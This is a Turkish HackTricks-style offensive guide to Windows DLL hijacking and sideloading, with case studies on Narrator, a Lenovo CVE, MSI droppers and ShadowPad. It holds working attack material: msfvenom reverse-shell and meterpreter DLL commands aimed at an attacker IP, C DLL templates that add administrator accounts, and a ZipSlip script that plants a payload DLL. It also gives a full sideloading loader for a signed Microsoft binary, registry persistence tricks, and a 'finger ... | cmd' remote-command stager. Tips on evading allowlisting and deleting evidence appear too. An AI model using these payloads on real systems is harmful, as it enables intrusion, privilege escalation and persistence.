# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Temel Bilgiler

DLL Hijacking, güvenilen bir uygulamanın kötü amaçlı bir DLL yükleyecek şekilde manipüle edilmesini içerir. Bu terim **DLL Spoofing, Injection, and Side-Loading** gibi birkaç taktiği kapsar. Genellikle kod yürütme, persistence sağlama ve daha az sık olarak privilege escalation için kullanılır. Burada escalation'a odaklanılsa da, hijacking yöntemi hedef ne olursa olsun aynıdır.

### Yaygın Yöntemler

Bu tekniklerin her biri, uygulamanın DLL yükleme stratejisine bağlı olarak farklı derecelerde etkili olabilir:

1. **DLL Replacement**: Gerçek bir DLL'i kötü amaçlı bir tanesiyle değiştirmek; gerekirse orijinal DLL'in işlevselliğini korumak için DLL Proxying kullanılabilir.
2. **DLL Search Order Hijacking**: Kötü amaçlı DLL'i, meşru olanın önüne geçecek şekilde bir arama yoluna yerleştirerek uygulamanın arama deseninden faydalanmak.
3. **Phantom DLL Hijacking**: Uygulamanın var olmadığını düşündüğü, ancak yüklendiğinde kötü amaçlı kod çalıştıracak bir DLL yaratmak.
4. **DLL Redirection**: Uygulamanın kötü amaçlı DLL'i yüklemesi için arama parametrelerini (%PATH% veya .exe.manifest / .exe.local gibi) değiştirmek.
5. **WinSxS DLL Replacement**: WinSxS dizinindeki meşru DLL'i kötü amaçlı bir muadiliyle değiştirmek; genellikle DLL side-loading ile ilişkilidir.
6. **Relative Path DLL Hijacking**: Kopyalanmış uygulamanın bulunduğu, kullanıcı tarafından kontrol edilen bir dizine kötü amaçlı DLL koymak; Binary Proxy Execution tekniklerine benzer.

> [!TIP]
> HTML staging, AES-CTR configs ve .NET implants katmanlarını DLL sideloading üzerine kademelendiren adım adım bir zincir için aşağıdaki workflow'u inceleyin.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Eksik Dll'leri Bulma

Sistemdeki eksik DLL'leri bulmanın en yaygın yolu, sysinternals'tan [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) çalıştırmak ve **aşağıdaki 2 filtreyi** ayarlamaktır:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

ve sadece **File System Activity**'yi gösterin:

![](<../../../images/image (153).png>)

Eğer genel olarak **eksik dll'leri** arıyorsanız bunu birkaç **saniye** boyunca çalışır bırakın.\
Belirli bir executable içindeki **eksik dll'i** arıyorsanız **başka bir filtre** eklemelisiniz; örneğin "Process Name" "contains" `<exec name>`, çalıştırıp event yakalamayı durdurun.

## Eksik Dll'leri Sömürme

Privilege escalation için sahip olduğumuz en iyi şans, **privilege bir sürecin yüklemeye çalışacağı bir dll'i yazabilmek** ve bu dll'in **aranacağı yerlerden birine** yazabilmektir. Bu nedenle ya **orijinal dll'in bulunduğu klasörden önce aranan** bir klasöre dll yazabileceğiz (garip bir durum), ya da dll'in aranacağı bir klasöre yazabileceğiz ve orijinal **dll hiçbir klasörde mevcut olmayacak**.

### Dll Arama Sırası

**Microsoft dokümantasyonunda** [**DLL'lerin nasıl yüklendiği**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) özel olarak bulunabilir.

Windows uygulamaları, DLL'leri önceden tanımlanmış bir dizi arama yolunu takip ederek arar ve belirli bir sıra izler. DLL hijacking sorunu, zararlı bir DLL'in bu dizinlerden birine stratejik olarak yerleştirilmesiyle ortaya çıkar; böylece meşru DLL'den önce yüklenir. Bunu önlemenin bir yolu, uygulamanın ihtiyaç duyduğu DLL'leri belirtirken mutlak yollar kullanmasını sağlamaktır.

Aşağıda 32-bit sistemlerdeki **DLL arama sırasını** görebilirsiniz:

1. Uygulamanın yüklendiği dizin.
2. system directory. Bu dizinin yolunu almak için [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) fonksiyonunu kullanın. (_C:\Windows\System32_)
3. 16-bit system directory. Bu dizinin yolunu alan bir fonksiyon yoktur, ancak aranır. (_C:\Windows\System_)
4. Windows directory. Bu dizinin yolunu almak için [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) fonksiyonunu kullanın.
1. (_C:\Windows_)
5. Current directory.
6. PATH environment variable içinde listelenen dizinler. Dikkat: bu, **App Paths** kayıt anahtarı ile belirtilen uygulamaya özel yolu içermez. **App Paths** anahtarı DLL arama yolu hesaplanırken kullanılmaz.

Bu, **SafeDllSearchMode** etkin iken varsayılan arama sırasıdır. Özelliği devre dışı bırakıldığında current directory ikinci sıraya yükselir. Bu özelliği devre dışı bırakmak için **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registry değerini oluşturun ve 0 olarak ayarlayın (varsayılan etkin).

Eğer [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) fonksiyonu **LOAD_WITH_ALTERED_SEARCH_PATH** ile çağrılırsa arama, **LoadLibraryEx**'in yüklediği executable modülün dizininde başlar.

Son olarak, bir dll bazen sadece isim yerine mutlak yol belirtilerek de yüklenebilir. Bu durumda o dll **sadece o yolda aranacaktır** (dll'in bağımlılıkları varsa, onlar isimle yüklendiği gibi aranacaktır).

Arama sırasını değiştirebilecek başka yollar da vardır ama burada onları açıklamayacağım.

### Rastgele dosya yazımını missing-DLL hijack ile zincirlemek

1. Hedef EXE için ProcMon filtreleri kullanın (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) ve süreç tarafından probe edilen ama bulunamayan DLL isimlerini toplayın.
2. Eğer ikili bir **schedule/service** üzerinde çalışıyorsa, bu isimlerden biriyle bir DLL'i **application directory**'ye (arama sırası giriş #1) koymak, bir sonraki çalıştırmada yüklenecektir. Bir .NET scanner örneğinde süreç, gerçek kopyayı `C:\Program Files\dotnet\fxr\...`'dan yüklemeden önce `C:\samples\app\` içinde `hostfxr.dll` arıyordu.
3. Herhangi bir export ile bir payload DLL oluşturun (ör. reverse shell): `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Eğer primitive'iniz bir **ZipSlip-style arbitrary write** ise, DLL'in uygulama klasörüne düşmesi için extraction dir'den kaçan bir girişi olan bir ZIP hazırlayın:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Arşivi izlenen inbox/share'a teslim edin; zamanlanmış görev süreci yeniden başlattığında süreç kötü amaçlı DLL'i yükler ve kodunuzu service account olarak yürütür.

### RTL_USER_PROCESS_PARAMETERS.DllPath aracılığıyla sideloading zorlamak

Yeni oluşturulan bir sürecin DLL arama yolunu deterministik olarak etkilemenin gelişmiş bir yolu, süreci ntdll’in native API'leri ile oluştururken RTL_USER_PROCESS_PARAMETERS içindeki DllPath alanını ayarlamaktır. Burada saldırgan kontrollü bir dizin sağlayarak, ithal edilen bir DLL'i adıyla (mutlak yol olmadan ve güvenli yükleme bayrakları kullanılmadan) çözen hedef süreç, o dizinden kötü amaçlı bir DLL yüklemeye zorlanabilir.

Key idea
- Süreç parametrelerini RtlCreateProcessParametersEx ile oluşturun ve kontrolünüzdeki klasöre işaret eden özel bir DllPath sağlayın (ör. dropper/unpacker'ın bulunduğu dizin).
- Süreci RtlCreateUserProcess ile oluşturun. Hedef ikili bir DLL'i adıyla çözdüğünde, loader çözümleme sırasında sağlanan bu DllPath'i dikkate alacak; böylece kötü amaçlı DLL hedef EXE ile aynı yerde olmasa bile güvenilir sideloading mümkün olur.

Notes/limitations
- Bu, oluşturulan child sürecini etkiler; yalnızca mevcut süreci etkileyen SetDllDirectory'den farklıdır.
- Hedef, DLL'i adıyla import etmeli veya LoadLibrary ile yüklemeli (mutlak yol olmadan ve LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories kullanılmadan).
- KnownDLLs ve sabitlenmiş mutlak yollar ele geçirilemez. Forwarded exports ve SxS önceliği değiştirebilir.

Minimal C example (ntdll, wide strings, basitleştirilmiş hata yönetimi):

<details>
<summary>Tam C örneği: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operasyonel kullanım örneği
- Kötü amaçlı xmllite.dll'yi (gerekli fonksiyonları export eden veya gerçek olana proxy yapan) DllPath dizininize yerleştirin.
- Yukarıdaki teknikle isimle xmllite.dll'e bakan bilinen imzalı bir binary başlatın. Loader, sağlanan DllPath aracılığıyla importu çözer ve DLL'inizi sideloads.

Bu teknikin, saha gözlemlerinde çok aşamalı sideloading zincirlerini tetiklediği rapor edilmiştir: ilk bir launcher yardımcı bir DLL bırakır, bu DLL daha sonra Microsoft-signed, hijackable bir binary oluşturur ve özel bir DllPath ile saldırganın DLL'inin staging directory'den yüklenmesini zorlar.


#### Windows dokümantasyonundan dll arama sırasına ilişkin istisnalar

Windows dokümantasyonunda standart DLL arama sırasına ilişkin bazı istisnalar belirtilmiştir:

- Bir **bellekte zaten yüklü olanla aynı adına sahip DLL** ile karşılaşıldığında, sistem normal aramayı atlar. Bunun yerine varsayılan olarak zaten bellekte olan DLL'e dönmeden önce yönlendirme ve manifest kontrolü yapar. **Bu durumda, sistem DLL için arama yapmaz**.
- DLL mevcut Windows sürümü için bir **known DLL** olarak tanınıyorsa, sistem arama sürecini atlayarak known DLL'in kendi sürümünü ve bağlı olduğu DLL'leri kullanır. Kayıt defteri anahtarı **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** bu known DLL'lerin listesini tutar.
- Bir **DLL'in bağımlılıkları varsa**, bu bağımlı DLL'lerin araması, ilk DLL tam yol ile tanımlanmış olsa bile sadece **module names** ile belirtilmiş gibi yapılır.

### Ayrıcalık Yükseltme

**Gereksinimler**:

- **Farklı ayrıcalıklar** (horizontal or lateral movement) altında çalışan veya çalışacak ve **DLL eksikliği olan** bir process tespit edin.
- **DLL'in aranacağı** herhangi bir **dizin** için **yazma izninizin (write access)** olduğundan emin olun. Bu konum yürütülebilir dosyanın dizini veya sistem yolu içindeki bir dizin olabilir.

Evet, gereksinimleri bulmak genellikle zordur çünkü **varsayılan olarak ayrıcalıklı bir yürütülebilir dosyanın DLL eksik olması tuhaf bir durumdur** ve bir sistem yolu klasöründe **yazma iznine sahip olmak daha da tuhaftır** (varsayılan olarak sahip olamazsınız). Ancak, yanlış yapılandırılmış ortamlarda bu mümkün olabilir.\
Şanslıysanız ve gereksinimleri karşıladığınızı görürseniz, [UACME](https://github.com/hfiref0x/UACME) projesine bakabilirsiniz. Projenin **ana amacı UAC'i atlatmak** olsa bile, orada kullanabileceğiniz Windows sürümü için bir **PoC** Dll hijacking bulabilirsiniz (muhtemelen yazma izniniz olan klasörün yolunu değiştirerek).

Bir klasörde **izinlerinizi kontrol edebileceğinizi** unutmayın, şu şekilde:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Ve **PATH içindeki tüm klasörlerin izinlerini kontrol edin**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Bir executable'ın imports'larını ve bir dll'in exports'larını şu şekilde kontrol edebilirsiniz:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
For a full guide on how to **abuse Dll Hijacking to escalate privileges** with permissions to write in a **System Path folder** check:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Otomatik araçlar

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) will check if you have write permissions on any folder inside system PATH.\
Diğer ilginç otomatik araçlar bu zafiyeti keşfetmek için **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ ve _Write-HijackDll_'dir.

### Örnek

Eğer istismar edilebilir bir senaryo bulursanız, bunu başarıyla istismar etmenin en önemli noktalarından biri, çalıştırılabilir dosyanın ondan import edeceği en azından tüm fonksiyonları export eden bir dll oluşturmaktır. Her halükârda, Dll Hijacking, [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) veya [ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system) için kullanışlıdır. You can find an example of **how to create a valid dll** inside this dll hijacking study focused on dll hijacking for execution: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows).\
Ayrıca, bir sonraki bölümde bazı **temel dll kodları** bulabilirsiniz; bunlar **şablon** olarak veya gerekmeyen fonksiyonları export eden bir **dll** oluşturmak için faydalı olabilir.

## **Creating and compiling Dlls**

### **Dll Proxifying**

Temelde bir **Dll proxy**, yüklendiğinde **kötü amaçlı kodunuzu çalıştırabilen**, aynı zamanda tüm çağrıları gerçek kütüphaneye ileterek **beklendiği gibi davranıp dışarıya açabilen** bir Dll'dir.

With the tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) or [**Spartacus**](https://github.com/Accenture/Spartacus) you can actually **indicate an executable and select the library** you want to proxify and **generate a proxified dll** or **indicate the Dll** and **generate a proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Bir meterpreter (x86) al:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Bir kullanıcı oluştur (x86, x64 sürümünü görmedim):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Kendi DLL'iniz

Derlediğiniz Dll'in birçok durumda, hedef işlem tarafından yüklenecek birkaç fonksiyonu **dışa aktarması** gerektiğini unutmayın; eğer bu fonksiyonlar yoksa **binary bunları yükleyemeyecek** ve **exploit başarısız olacak**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Kullanıcı oluşturma içeren C++ DLL örneği</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>İş parçacığı başlangıçlı alternatif C DLL</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Vaka Çalışması: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe, başladığında hâlâ öngörülebilir, dil-özgü bir localization DLL'ini arar; bu DLL arbitrary code execution ve persistence için hijacked edilebilir.

Key facts
- Deneme yolu (mevcut sürümler): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Eski yol (eski sürümler): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- OneCore yolunda saldırgan kontrollü ve yazılabilir bir DLL varsa, bu yüklenir ve `DllMain(DLL_PROCESS_ATTACH)` çalışır. Herhangi bir export gerekmez.

Discovery with Procmon
- Filtre: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Narrator'ı başlatın ve yukarıdaki yolun yükleme denemesini gözlemleyin.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC sessizliği
- Basit bir hijack UI'yi konuşur/vurgular. Sessiz kalmak için, attach olduğunuzda Narrator iş parçacıklarını listeleyin, ana iş parçacığını açın (`OpenThread(THREAD_SUSPEND_RESUME)`) ve `SuspendThread` ile durdurun; kendi iş parçacığınızda devam edin. Tam kod için PoC'ye bakın.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Yukarıdakilerle, Narrator başlatıldığında yerleştirilen DLL yüklenir. Secure desktop (logon screen) üzerinde CTRL+WIN+ENTER tuşlarına basarak Narrator'ı başlatın; DLL'iniz secure desktop üzerinde SYSTEM olarak çalışır.

RDP-triggered SYSTEM execution (lateral movement)
- Klasik RDP security layer'ını izin verin: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Host'a RDP ile bağlanın, logon ekranında CTRL+WIN+ENTER ile Narrator'ı başlatın; DLL'iniz secure desktop'ta SYSTEM olarak çalışır.
- Çalışma RDP oturumu kapandığında durur — hızlıca inject/migrate edin.

Bring Your Own Accessibility (BYOA)
- Yerleşik bir Accessibility Tool (AT) registry girdisini (ör. CursorIndicator) klonlayabilir, onu rastgele bir binary/DLL'e işaret edecek şekilde düzenleyip import edebilir, ardından `configuration` değerini o AT adına ayarlayabilirsiniz. Bu, Accessibility framework'ü altında rastgele kod çalıştırmayı proxy'ler.

Notlar
- `%windir%\System32` altına yazmak ve HKLM değerlerini değiştirmek admin yetkisi gerektirir.
- Tüm payload mantığı `DLL_PROCESS_ATTACH` içinde yaşayabilir; export gerekmez.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Bu vaka Lenovo'nun TrackPoint Quick Menu'sü (`TPQMAssistant.exe`) içindeki **Phantom DLL Hijacking** örneğini gösterir; takip edilen ID **CVE-2025-1729**'dur.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` konumu `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` her gün saat 09:30'da oturum açmış kullanıcı bağlamında çalışır.
- **Directory Permissions**: `CREATOR OWNER` tarafından yazılabilir, yerel kullanıcıların rastgele dosyalar bırakmasına izin verir.
- **DLL Search Behavior**: Çalışma dizininden önce `hostfxr.dll` yüklemeyi deniyor ve eksikse "NAME NOT FOUND" kaydeder; bu, yerel dizin aranmasının öncelikli olduğunu gösterir.

### Exploit Implementation

Saldırgan aynı dizine kötü amaçlı bir `hostfxr.dll` stub'u yerleştirerek eksik DLL'i suistimal edip kullanıcının bağlamında kod çalıştırabilir:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Saldırı Akışı

1. Standart bir kullanıcı olarak `hostfxr.dll` dosyasını `C:\ProgramData\Lenovo\TPQM\Assistant\` dizinine bırakın.
2. Zamanlanmış görevin mevcut kullanıcının bağlamında saat 09:30'da çalışmasını bekleyin.
3. Görev çalıştığında bir yönetici oturum açmışsa, kötü amaçlı DLL yönetici oturumunda medium integrity seviyesinde çalışır.
4. medium integrity'den SYSTEM ayrıcalıklarına yükselmek için standart UAC bypass tekniklerini zincirleyin.

## Vaka İncelemesi: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Tehdit aktörleri sıklıkla MSI tabanlı droper'leri DLL side-loading ile eşleştirerek güvenilir, imzalı bir süreç altında payload'ları çalıştırır.

Zincir özeti
- Kullanıcı MSI indirir. GUI kurulum sırasında (ör. LaunchApplication veya bir VBScript action) bir CustomAction sessizce çalışır ve gömülü kaynaklardan bir sonraki aşamayı yeniden oluşturur.
- Dropper meşru, imzalı bir EXE ve kötü amaçlı bir DLL'i aynı dizine yazar (örnek çift: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- İmzalı EXE başlatıldığında, Windows DLL arama sırası çalışma dizinindeki wsc.dll'yi önce yükler ve imzalı bir üst süreç altında saldırgan kodunu çalıştırır (ATT&CK T1574.001).

MSI analizi (nelere bakılmalı)
- CustomAction table:
- Yürütülebilir dosyaları veya VBScript çalıştıran girdileri arayın. Şüpheli örüntü: LaunchApplication'ın arka planda gömülü bir dosya çalıştırması.
- Orca (Microsoft Orca.exe) içinde CustomAction, InstallExecuteSequence ve Binary tablolarını inceleyin.
- MSI CAB içinde gömülü/ayrılmış payload'lar:
- Yönetici çıkarımı: msiexec /a package.msi /qb TARGETDIR=C:\out
- Veya lessmsi kullanın: lessmsi x package.msi C:\out
- Bir VBScript CustomAction tarafından birleştirilen ve şifre çözülen birden fazla küçük parçaya bakın. Yaygın akış:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
wsc_proxy.exe ile pratik sideloading
- Bu iki dosyayı aynı klasöre koyun:
- wsc_proxy.exe: meşru, imzalı host (Avast). Süreç, kendi dizininden adıyla wsc.dll'i yüklemeye çalışır.
- wsc.dll: saldırgan DLL. Belirli exports gerekmedikçe DllMain yeterli olabilir; aksi takdirde bir proxy DLL oluşturun ve gerekli exports'ları gerçek kütüphaneye yönlendirirken payload'ı DllMain içinde çalıştırın.
- Minimal bir DLL payload oluşturun:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Dışa aktarma gereksinimleri için, DLLirant/Spartacus gibi bir proxy framework kullanarak payload'unuzu da çalıştıran bir forwarding DLL oluşturun.

- Bu teknik host binary'nin DLL isim çözümlemesine dayanır. Eğer host mutlak yollar veya güvenli yükleme flag'leri (ör. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories) kullanıyorsa, hijack başarısız olabilir.
- KnownDLLs, SxS ve forwarded exports önceliği etkileyebilir ve host binary ile export seti seçilirken dikkate alınmalıdır.

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point, Ink Dragon'ın ShadowPad'i çekirdek payload'u diskte şifreli tutarken meşru yazılımlara karışmak için nasıl bir **three-file triad** kullandığını açıkladı:

1. **Signed host EXE** – AMD, Realtek veya NVIDIA gibi tedarikçiler kötüye kullanılır (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Saldırganlar çalıştırılabilir dosyanın adını Windows binary'si gibi göstermek için değiştirirler (örneğin `conhost.exe`), ancak Authenticode imzası geçerli kalır.
2. **Malicious loader DLL** – EXE'nin yanına beklenen isimle bırakılır (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL genellikle ScatterBrain framework ile obfuskelenmiş bir MFC binary'sidir; tek görevi şifreli bloğu bulmak, deşifre etmek ve ShadowPad'i reflectively map etmektir.
3. **Encrypted payload blob** – genellikle aynı dizinde `<name>.tmp` olarak saklanır. Deşifre edilmiş payload bellek eşlemesi yapıldıktan sonra loader TMP dosyasını adli delilleri yok etmek için siler.

Tradecraft notları:

* İmzalı EXE'nin adını değiştirmek (PE header'daki orijinal `OriginalFileName` korunurken) ona Windows binary'si gibi görünme imkanı verir ancak tedarikçi imzasını korur; Ink Dragon’ın `conhost.exe` benzeri görünümlü ama aslında AMD/NVIDIA araçları olan binary'leri bırakma alışkanlığını taklit edin.
* Çalıştırılabilir dosya güvenilir kaldığından, çoğu allowlisting kontrolü yanına yerleştirilen kötü amaçlı DLL ile atlatılabilir. Loader DLL'i özelleştirmeye odaklanın; imzalı parent genelde değişmeden çalıştırılabilir.
* ShadowPad'in decryptor'ı TMP blob'un loader'ın yanında bulunmasını ve haritalama sonrası sıfırlanabilmesi için yazılabilir olmasını bekler. Payload belleğe yüklendiği sürece dizini yazılabilir tutun; yükleme sonrası TMP dosyası OPSEC için güvenle silinebilir.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operatörler DLL sideloading'i LOLBAS ile eşleştirir; böylece diskteki tek özel artefakt güvenilen EXE'nin yanındaki kötü amaçlı DLL olur:

- **Remote command loader (Finger):** Gizli PowerShell `cmd.exe /c` başlatır, bir Finger sunucusundan komutları çeker ve bunları `cmd`'ye aktarır:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` TCP/79 üzerinden metin çeker; `| cmd` sunucu yanıtını çalıştırır ve operatörlerin ikinci aşama sunucu tarafını döndürmesine izin verir.

